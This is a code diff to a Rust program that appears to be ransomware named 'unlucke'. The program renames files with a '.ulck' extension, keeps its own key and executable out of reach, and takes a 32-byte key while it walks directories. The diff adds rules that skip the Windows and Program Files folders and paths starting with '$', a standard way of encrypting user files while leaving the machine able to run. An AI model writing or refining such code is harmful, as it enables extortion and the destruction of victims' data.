@@ -16,14 +16,18 @@ use std::{
 };
 
 static ENCRYPTED_EXTENSION: &str = ".ulck";
+static MAX_FILE_SIZE: u64 = 1000000000;
+
+static IGNORE_DIRECTORY_START: [&str; 1] = ["$"];
+static IGNORE_DIRECTORY_END: [&str; 3] = ["Windows", "Program Files", "Program Files (x86)"];
+static IGNORE_START: [&str; 1] = ["$"];
 static IGNORE_END: [&str; 4] = [
     ENCRYPTED_EXTENSION,
     "unlucke.key",
     "unlucke.exe",
     "desktop.ini",
 ];
-static IGNORE_START: [&str; 1] = ["$"];
-static MAX_FILE_SIZE: u64 = 1000000000;
+
 static COOL_TEXT: &str = r#"    __    __  __    __  __        __    __   ______   __    __  ________
    /  |  /  |/  \  /  |/  |      /  |  /  | /      \ /  |  /  |/        |
    $$ |  $$ |$$  \ $$ |$$ |      $$ |  $$ |/$$$$$$  |$$ | /$$/ $$$$$$$$/
@@ -33,6 +37,7 @@ static COOL_TEXT: &str = r#"    __    __  __    __  __        __    __   ______ 
    $$ \__$$ |$$ |$$$$ |$$ |_____ $$ \__$$ |$$ \__/  |$$ |$$  \ $$ |_____
    $$    $$/ $$ | $$$ |$$       |$$    $$/ $$    $$/ $$ | $$  |$$       |
     $$$$$$/  $$/   $$/ $$$$$$$$/  $$$$$$/   $$$$$$/  $$/   $$/ $$$$$$$$/"#;
+
 static GLOBAL_THREAD_COUNT: AtomicUsize = AtomicUsize::new(0);
 static MILLISECOND: Duration = Duration::from_millis(1);
 
@@ -104,6 +109,18 @@ fn runDirEntry(dirEntryPath: &str, key: &[u8; 32]) {
     };
 
     if metadata.is_dir() {
+        for ignore in IGNORE_DIRECTORY_START {
+            if dirEntryPath.starts_with(ignore) {
+                return;
+            }
+        }
+
+        for ignore in IGNORE_DIRECTORY_END {
+            if dirEntryPath.ends_with(ignore) {
+                return;
+            }
+        }
+
         let dirEntries = match fs::read_dir(dirEntryPath) {
             Ok(paths) => paths,
             Err(_) => return,
